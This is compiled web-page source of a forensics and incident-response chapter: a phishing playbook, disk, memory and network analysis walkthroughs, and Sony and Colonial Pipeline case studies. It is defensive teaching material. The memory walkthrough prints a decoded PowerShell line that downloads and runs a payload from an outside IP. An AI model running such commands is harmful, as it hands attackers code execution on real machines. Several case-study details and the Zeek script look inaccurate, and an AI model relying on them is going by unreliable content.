        children: "╔════════════════════════════════════════════════════════════╗\n║         PHISHING INCIDENT RESPONSE PLAYBOOK               ║\n║                Version 1.0 | IR-PB-002                    ║\n╚════════════════════════════════════════════════════════════╝\n\n1. USER REPORTING\n   □ User reports suspicious email to security@company.com\n   □ User forwards email to phishing mailbox\n   □ User reports via PhishAlarm button\n\n2. TRIAGE (within 5 minutes)\n   □ Extract email headers (Received, SPF, DKIM, DMARC)\n   □ Identify links and attachments in email\n   □ Extract sender domain and IP\n   □ Check if similar phishes reported by others\n   □ Determine phishing type (credential, malware, BEC)\n\n3. ANALYSIS (within 15 minutes)\n   □ Submit URL to URL scanner (VirusTotal, urlscan.io)\n   □ Submit attachment to sandbox (any.run, Joe Sandbox)\n   □ Analyze email headers for spoofing indicators\n   □ Check if any user clicked the link\n   □ Check if any user entered credentials\n\n4. CONTAINMENT (within 15 minutes if users compromised)\n   □ If credentials stolen: force password reset for all recipients\n   □ Enable MFA if not already enabled\n   □ Remove malicious emails from all inboxes:\n     Get-ComplianceSearch -Name \"Phish-Removal\" | \n       New-ComplianceSearchAction -Purge -PurgeType HardDelete\n   □ Block sender domain at email gateway\n   □ Block malicious URLs at web proxy\n\n5. ERADICATION\n   □ If malware: scan affected endpoints\n   □ If credential phishing: verify no other accounts compromised\n   □ Check for mailbox rules created by attacker (forwarding)\n\n6. RECOVERY\n   □ Remove blocked sender after threat expired\n   □ Restore any deleted legitimate emails caught in purge\n\n7. POST-INCIDENT\n   □ Add email template to phishing training\n   □ Update email gateway rules\n   □ Brief users on this specific phish\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "109-incident-severity-classification",
      children: "10.9 Incident Severity Classification"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "NIST-Based Classification:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Class"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Criteria"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Examples"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Response"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Category 1"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unauthorized access, data exfiltration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attacker gained admin access, customer data stolen"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full CSIRT activation, Legal, PR"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Category 2"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware requiring manual containment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Ransomware on 1+ servers"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CSIRT activation, containment"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Category 3"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DoS, targeted scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DDoS attack, port scans"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IT operations + SOC"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Category 4"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Phishing, social engineering"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Phish campaign, single user compromised"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SOC triage, user training"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Category 5"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Policy violation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User installing unauthorized software"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "HR + IT"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "11-practical-examples--full-tool-walkthroughs",
      children: "11. Practical Examples → Full Tool Walkthroughs"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "111-ftk-imager--dd--disk-image-acquisition",
      children: "11.1 FTK Imager / dd → Disk Image Acquisition"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Scenario:"
      }), " Acquire a forensic image of a compromised Windows workstation's hard drive."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Method 1: FTK Imager (GUI)\n# 1. Launch FTK Imager (Run as Administrator)\n# 2. File → Create Disk Image\n# 3. Select Source: Physical Drive (or Logical Drive)\n# 4. Select the compromised drive (e.g., \\\\.\\PHYSICALDRIVE1)\n# 5. Click Next\n# 6. Evidence Item Information:\n#    - Case Number: IR-2024-001\n#    - Evidence Number: 001\n#    - Unique Description: HR-01 Compromised Workstation\n#    - Examiner: John Smith\n#    - Notes: Acquired after memory capture, write-blocker used\n# 7. Image Destination:\n#    - Image Type: dd (raw) or E01 (EnCase with compression)\n#    - Destination: D:\\evidence\\case-001\\\n#    - Image Name: HR-01\n#    - Fragment Size: 0 (no splitting)\n#    - Compression: 0 (none) for dd, 1-9 for E01\n# 8. Verify Images: Check \"Verify images after they are created\"\n# 9. Create AD1 (logical evidence file): Optional\n# 10. Start → Progress bar shows acquisition (typically 15-60 min for 500 GB)\n# 11. Result: HR-01.dd (raw image) + HR-01.txt (verification report)\n\n# Method 2: dd (command line)\n# Identify the drive\nlsblk\n# Example: /dev/sdb is the compromised drive (500 GB SSD)\n\n# Acquire the image\nsudo dc3dd if=/dev/sdb \\\n    of=/evidence/case-001/hr-01.dd \\\n    hash=sha256 \\\n    hof=/evidence/case-001/hr-01.sha256 \\\n    log=/evidence/case-001/acquisition.log \\\n    bs=4M \\\n    progress=on\n\n# Expected output:\n# 122097MiB 0% read | ETA: 0:12:34 | 45.2 MiB/s\n# 244195MiB 25% read | ETA: 0:09:22 | 44.8 MiB/s\n# ...\n# 488373MiB 100% read | ETA: 0:00:00 | 45.0 MiB/s\n# Total bytes read: 512110190592 (500GB)\n# SHA256: a8f5f167f44f4964e6c998d67f3b3b9e...\n# Input hash verified against output\n\n# Verify the image\nsha256sum /evidence/case-001/hr-01.dd\n# Compare with the hash in acquisition.log → they must match\n\n# Method 3: FTK Imager (CLI)\nfcapture.exe \\\n    /evidence=\"\\\\.\\PHYSICALDRIVE1\" \\\n    /destination=\"D:\\evidence\\case-001\\HR-01\" \\\n    /verify=true \\\n    /format=raw\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "112-autopsy--sleuth-kit--file-system-analysis-and-recovery",
      children: "11.2 Autopsy / Sleuth Kit → File System Analysis and Recovery"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Scenario:"
      }), " Analyze the acquired disk image to find deleted files and reconstruct the attack timeline."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Step 1: Load the image into Sleuth Kit\n# View partition layout\nmmls /evidence/case-001/hr-01.dd\n\n# Example output:\n# Slot  Start       End          Size        Description\n# 00:   0000000000  0000000000   0000000512  Primary Table\n# 01:   0000002048  976773167    0976771120  NTFS (0x07)\n# 02:   976773168  976773134    0000000000  Unallocated\n\n# Step 2: List files from the NTFS partition (offset 2048)\nfls -o 2048 -r /evidence/case-001/hr-01.dd > /evidence/case-001/file_list.txt\n\n# Show deleted files\nfls -o 2048 -rd /evidence/case-001/hr-01.dd | head -50\n\n# Example output:\n# r/r 45:    Invoice_2024.docm (deleted)\n# r/r 46:    .invoice_tmp (deleted)\n# r/r 128:   beacon.dll (deleted)\n# r/r 129:   update_service.exe (deleted)\n# d/d 130:   .malware_temp (deleted)\n\n# Step 3: Get metadata for the deleted beacon.dll\nistat -o 2048 /evidence/case-001/hr-01.dd 128\n\n# Example output:\n# MFT Entry Header Values:\n# Entry: 128        Sequence: 2\n# $LogFile Sequence Number: 18446744073709551615\n# Links: 0\n# $STANDARD_INFORMATION\n#   Created:    2024-06-15 14:30:12\n#   File Modified: 2024-06-15 14:30:12\n#   MFT Modified:  2024-06-15 14:30:12\n#   Accessed:      2024-06-15 14:30:12\n# $FILE_NAME\n#   Created:    2024-06-15 14:30:12\n#   File Modified: 2024-06-15 14:30:12\n#   MFT Modified:  2024-06-15 14:30:12\n#   Accessed:      2024-06-15 14:30:12\n# Parent Ref: 5 (Downloads)\n# $DATA\n#   File Size: 342016 bytes\n#   Clusters: 84 (non-resident)\n#   1280 - 1363\n\n# Step 4: Recover the deleted beacon.dll\nicat -o 2048 /evidence/case-001/hr-01.dd 128 > /evidence/case-001/recovered/beacon.dll\n\n# Verify the recovered file\nfile /evidence/case-001/recovered/beacon.dll\n# Output: PE32+ executable (DLL) (GUI) x86-64, for MS Windows\n\nsha256sum /evidence/case-001/recovered/beacon.dll\n# Check hash against VirusTotal\n\n# Step 5: Recover all deleted files\ntsk_recover -o 2048 -e /evidence/case-001/hr-01.dd /evidence/case-001/recovered/\n\n# Step 6: Use Autopsy (GUI) for visual timeline analysis\n# 1. Launch Autopsy\n# 2. Create New Case → Case Name: IR-2024-001\n# 3. Add Data Source → Disk Image → hr-01.dd\n# 4. Select ingest modules:\n#    □ Recent Activity\n#    □ Hash Lookup (NSRL)\n#    □ File Type Identification\n#    □ Extension Mismatch Detection\n#    ☑ Email Parser\n#    ☑ Interesting Files Identifier\n#    □ Keyword Search (add: \"password\", \"admin\", \"185.234.72\")\n#    □ Timeline\n# 5. Run Ingest (may take 30-60 min for 500 GB)\n# 6. Results view:\n#    - Deleted Files → recovered beacon.dll, update_service.exe\n#    - Interesting Files → .docm with macro, password-protected ZIP\n#    - Timeline → events at 14:30:00 spike\n#    - Keyword Hits → \"https://185.234.72.18/payload\" found in unallocated space\n#    - Email → phishing email in Outlook PST\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "113-volatility-3--full-memory-analysis-walkthrough",
      children: "11.3 Volatility 3 → Full Memory Analysis Walkthrough"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Scenario:"
      }), " Analyze a memory dump from a compromised system with fileless malware."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-powershell",
        children: "# Step 1: Verify the memory dump\npython3 vol.py -f memory.raw windows.info\n\n# Output:\n# Volatility 3 Framework 2.5.0\n# Windows Version: Windows 10 Version 1909 (Build 18363)\n# Number of Processors: 4\n# Image Date: 2024-06-15 14:30:00 UTC\n# Kernel Base: 0xf8000281a000\n# Memory capture successful → 16 GB dump, no corruption\n\n# Step 2: Scan for hidden/unlinked processes\npython3 vol.py -f memory.raw windows.psscan\n\n# psscan uses pool tag scanning (not process list) → finds hidden processes\n# Compare with pslist (which uses the active process list)\n# Hidden processes appear in psscan but NOT in pslist\n\n# Step 3: Look for suspicious parent-child relationships\npython3 vol.py -f memory.raw windows.pstree\n\n# Key findings:\n# WINWORD.EXE (PID 3100) spawned cmd.exe (PID 3420) → unusual\n# cmd.exe spawned powershell.exe (PID 3456) → script execution\n# powershell.exe has no child windows (GUI not visible) → hidden window\n# PID 3456 has high handle count (500+) → active network operations\n\n# Step 4: Extract command-line arguments\npython3 vol.py -f memory.raw windows.cmdline --pid 3456\n\n# Reveals encoded PowerShell command\n\n# Step 5: Decode the Base64 command\necho \"SQBFADAAKAA...\" | base64 -d | iconv -f UTF-16LE -t ASCII\n# Decoded: IEX (New-Object Net.WebClient).DownloadString('http://185.234.72.18/payload')\n\n# Step 6: Find network connections\npython3 vol.py -f memory.raw windows.netscan | Select-String \"ESTABLISHED\"\n\n# Found: PID 3456 connected to 185.234.72.18:443 (C2)\n# Found: PID 3456 connected to 192.168.1.50:445 (SMB lateral movement)\n# Found: PID 3456 connected to 198.51.100.50:21 (FTP data exfiltration)\n\n# Step 7: Check for injected code\npython3 vol.py -f memory.raw windows.malfind --pid 3456\n\n# Found 7 regions with PAGE_EXECUTE_READWRITE protection\n# Dumped injected code to: pid.3456.0x2b0000.dmp\n\n# Step 8: Check loaded DLLs\npython3 vol.py -f memory.raw windows.dlllist --pid 3456\n\n# Suspicious DLL found: C:\\Users\\jdoe\\AppData\\Temp\\beacon.dll\n# Normal path would be C:\\Windows\\System32\\\n\n# Step 9: Check handles\npython3 vol.py -f memory.raw windows.handles --pid 3456\n\n# Handles to:\n# - Network socket handles (TCP connections)\n# - File handles in C:\\Users\\jdoe\\Documents\\secrets\\ (data staging)\n# - Mutex: Global\\MSOffice_16 (typical Cobalt Strike named pipe)\n\n# Step 10: Extract process memory for further analysis\npython3 vol.py -f memory.raw windows.memmap --pid 3456 --dump\n# Output: pid.3456.dmp\n\n# Scan with YARA\nyara cobaltstrike_rules.yara pid.3456.dmp\n# Match: CobaltStrike_Beacon at offset 0x2b0000\n\n# Step 11: Dump injected code regions\npython3 vol.py -f memory.raw windows.malfind --pid 3456 --dump\n# Output: process.3456.0x2b0000.dmp, process.3456.0x310000.dmp, ...\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "114-wireshark--network-traffic-analysis-walkthrough",
      children: "11.4 Wireshark → Network Traffic Analysis Walkthrough"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Scenario:"
      }), " Analyze a PCAP file to identify C2 communication and recover exfiltrated data."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Step 1: Get summary statistics\ntshark -r evidence/capture.pcap -z io,phs -q\n\n# Output:\n# =========================================================================\n# Protocol Hierarchy Statistics\n# Filter: \n# eth:::1.3M frames\n#   ip:::1.2M frames\n#     tcp:::1.1M frames\n#       http:::245K frames\n#       tls:::312K frames\n#       smb:::89K frames\n#     udp:::100K frames\n#       dns:::45K frames\n\n# Step 2: Identify top talkers\ntshark -r evidence/capture.pcap -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -rn | head -20\n\n# Output:\n# 245000 192.168.1.105,185.234.72.18  ← heavy traffic to C2\n# 120000 192.168.1.105,13.107.4.52    ← Windows Update\n# 89000  192.168.1.105,192.168.1.50   ← Internal server (lateral movement)\n\n# Step 3: Extract HTTP objects (files transferred over HTTP)\ntshark -r evidence/capture.pcap --export-objects http,/evidence/extracted_http/\n\n# Files extracted:\n# /evidence/extracted_http/payload.exe (342 KB)\n# /evidence/extracted_http/status.png?session=abc123 (response, repeated every 60s)\n\n# Step 4: Follow TCP stream of C2 connection\ntshark -r evidence/capture.pcap -z follow,tcp,ascii,45 -q\n\n# Shows the full conversation between victim and C2 server\n\n# Step 5: Detect beaconing pattern\ntshark -r evidence/capture.pcap -Y \"ip.dst == 185.234.72.18\" -T fields -e frame.time_epoch > c2_times.txt\npython3 -c \"\ntimes = [float(l.strip()) for l in open('c2_times.txt')]\nintervals = [times[i+1] - times[i] for i in range(len(times)-1)]\nprint(f'Total connections: {len(times)}')\nprint(f'Mean interval: {sum(intervals)/len(intervals):.1f}s')\nprint(f'Min: {min(intervals):.1f}s, Max: {max(intervals):.1f}s')\nprint(f'Std dev: {(__import__(\\\"statistics\\\").stdev(intervals)):.1f}s')\n\"\n# Output suggests 60 second beacon interval with <5s jitter\n\n# Step 6: Identify SMB lateral movement\ntshark -r evidence/capture.pcap -Y \"ip.dst == 192.168.1.50 and smb\" -T fields -e frame.time_relative -e smb.cmd\n\n# Shows: SMB commands between 14:45:00 and 14:50:00 → file copy operation\n\n# Step 7: Detect FTP data exfiltration\ntshark -r evidence/capture.pcap -Y \"ip.dst == 198.51.100.50 and ftp\" -T fields -e ftp.request.command -e ftp.request.arg\n\n# Shows: USER, PASS, STOR secrets.7z → FTP upload of staged data\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "115-zeek--network-log-generation-and-beaconing-detection",
      children: "11.5 Zeek → Network Log Generation and Beaconing Detection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Step 1: Generate Zeek logs from PCAP\nzeek -r evidence/capture.pcap local\n\n# Generates: conn.log, dns.log, http.log, ssl.log, files.log, notice.log, x509.log\n\n# Step 2: Analyze conn.log for suspicious connections\nzeek-cut ts id.orig_h id.resp_h id.resp_p proto service orig_bytes resp_bytes conn_state < conn.log | head -30\n\n# Step 3: Analyze dns.log for DGA\nzeek-cut ts query qtype rcode < dns.log | grep -v \"windows.com\\|google.com\\|microsoft.com\" | sort\n\n# Step 4: Analyze http.log for C2 patterns\nzeek-cut ts host method uri user_agent < http.log | grep -i \"status.png\\|checkin\\|beacon\"\n\n# Step 5: Extract files transferred over network\ncat files.log | zeek-cut tx_hosts rx_hosts mime_type filename\n# SHA-256 extracted files for threat intel lookup\n\n# Step 6: Create custom beaconing detection in Zeek\ncat > beacon_detect.zeek << 'EOF'\nmodule BeaconDetect;\n\nexport {\n    redef enum Notice::Type += {\n        Periodic_Connection\n    };\n    global connection_counts: table[addr, addr] of count &default=0;\n    global first_seen: table[addr, addr] of time;\n}\n\nevent connection_established(c: connection) {\n    local src = c$id$orig_h;\n    local dst = c$id$resp_h;\n    \n    if (dst !in first_seen[src])\n        first_seen[src, dst] = network_time();\n    \n    connection_counts[src, dst] += 1;\n    \n    if (connection_counts[src, dst] == 20) {\n        local elapsed = network_time() - first_seen[src, dst];\n        if (elapsed > 120 && elapsed < 600) {\n            NOTICE([$note=Periodic_Connection,\n                    $msg=fmt(\"Beaconing detected: %s to %s, %d connections in %.0f seconds\", src, dst, connection_counts[src, dst], elapsed),\n                    $src=src]);\n        }\n    }\n}\nEOF\n\nzeek -r evidence/capture.pcap beacon_detect.zeek\ncat notice.log\n# Output: Beaconing detected: 192.168.1.105 to 185.234.72.18, 20 connections in 120 seconds\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h1, {
      id: "chapter-8-forensics--incident-response-4",
      children: "Chapter 8: Forensics & Incident Response"
    }), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "12-case-studies",
      children: "12. Case Studies"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "121-sony-pictures-entertainment-2014",
      children: "12.1 Sony Pictures Entertainment 2014"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Background:"
      }), " In November 2014, Sony Pictures Entertainment suffered one of the most destructive cyber attacks in corporate history. The attack was attributed to the North Korean government (the \"Guardians of Peace\" or GOP group) in retaliation for the movie \"The Interview,\" a comedy about the assassination of Kim Jong-un."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Technical Attack Chain:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Phase"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Detail"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Forensic Evidence"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Initial Access"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Spear-phishing emails sent to Sony executives (September 2014)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Email logs, attachments analyzed by FBI"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Persistence"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Backdoor installed on Windows domain controllers"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Registry keys, service installation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Lateral Movement"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pass-the-Hash, PsExec, WMI to spread across network"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Event ID 4624, 4648, SMB connections"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Data Theft"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "100+ TB of data exfiltrated over weeks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network flow logs, large outbound transfers"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Destruction"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disk wiper (Shamoon-like) destroyed MBRs on 3,000+ computers"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MBR analysis → overwritten with \"Hacked by #GOP\" image"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Data Dump"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "100+ TB leaked via file-sharing sites"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Torrent trackers logged release"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Forensic Investigation (FBI + Mandiant):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Evidence Collected:\n- 3,000+ hard drive images (wd: actually wiped systems → only partial recovery)\n- Domain controller memory dumps (captured AD state before wipe)\n- Network flow data (Cisco NetFlow) since September 2014\n- Email server logs (phishing email identification)\n- Lateral movement paths reconstructed from Windows event logs\n\nKey Forensic Findings:\n1. Initial intrusion: Spear-phish → email with malicious link to \"Pastebin-like\" page\n   Using IE vulnerability (CVE-2014-1761) → dropped backdoor\n\n2. Backdoor: \"BACKDOOR.PEARLPOP\" → custom backdoor communicating via HTTPS\n   Using stolen Sony code-signing certificate → bypassed security software\n\n3. Lateral Movement:\n   - Dumped lsass.exe memory via procdump\n   - Extracted domain admin credentials\n   - Used PsExec to install wiper across all systems\n   - Timeline: initial access → data theft → wipe: 2 months dwell time\n\n4. Data Theft:\n   - Exfiltrated in small chunks over 7 weeks\n   - Used HTTPS to multiple VPS servers worldwide\n   - Total: 100+ TB including PII, financial data, unreleased films\n\n5. Disk Wiper (Shamoon):\n   - Overwrote MBR with GOP image\n   - Overwrote data with raw bytes (not encrypted)\n   - Forensically: MBR hex showed \"HACKED BY #GOP\"\n   - Wiped ~75% of Sony's 3,000+ Windows servers and workstations\n\nTimeline of Key Events (from FBI report):\n- Sep 2014: Initial phishing emails sent to Sony executives\n- Oct 2014: Attacker maintains access, maps network, escalates privileges\n- Nov 2014: Data exfiltration begins (weeks of slow theft)\n- Nov 21, 2014: Threats to release data appear on Sony systems\n- Nov 24, 2014: Disk wiper activated → systems go dark\n- Nov 25, 2014: Public data leak begins\n- Dec 2014: FBI investigation begins\n- Dec 19, 2014: \"The Interview\" released in limited theaters despite threats\n\nIR Response Analysis:\n- No CSIRT in place → Sony had no dedicated IR team\n- No network segmentation → attackers moved freely\n- No MFA on domain admin accounts\n- No centralized logging → limited forensic visibility\n- Response was chaotic → FBI had to lead the investigation\n- Positive outcome: established the need for executive protection and cyber resilience\n\nLessons Learned:\n1. Network segmentation is essential → the entire Sony network was flat\n2. Monitor for unapproved code-signing (stolen certificates are invisible)\n3. Endpoint detection on critical workstations (domain controllers)\n4. MFA for ALL privileged accounts → no exceptions\n5. Incident response plan must include: \"What if we lose 3,000 computers simultaneously?\"\n6. Disk wiper threats require offline backups (not network-connected)\n7. Executive email accounts need enhanced protection\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "122-colonial-pipeline-2021",
      children: "12.2 Colonial Pipeline 2021"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Background:"
      }), " On May 6, 2021, Colonial Pipeline → operator of the largest refined oil pipeline in the United States (5,500 miles, 2.5 million barrels/day) → was hit by a ransomware attack. The attack forced the company to shut down pipeline operations, causing fuel shortages across the US East Coast. The attack was attributed to the DarkSide ransomware group, a Russian-speaking cybercriminal organization."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Technical Attack Chain:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Phase"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Detail"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Forensic Evidence"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Initial Access"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "VPN account compromise → legacy VPN not used for months, no MFA"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "VPN logs showed credential use from new IP"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Persistence"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DarkSide ransomware deployed on IT systems"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Ransomware binary, encryption artifacts"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Lateral Movement"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Compromised credentials used to move from IT to OT-adjacent systems"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Event logs, network connections"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Encryption"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "~100 GB of data encrypted across IT systems"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Ransomware note, encrypted file extensions"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Extortion"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "100 GB of data exfiltrated before encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data size reported in extortion note"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Shutdown"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pipeline SCADA systems taken offline as precaution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Human decision to prevent OT impact"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Forensic Investigation (Mandiant + FBI):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
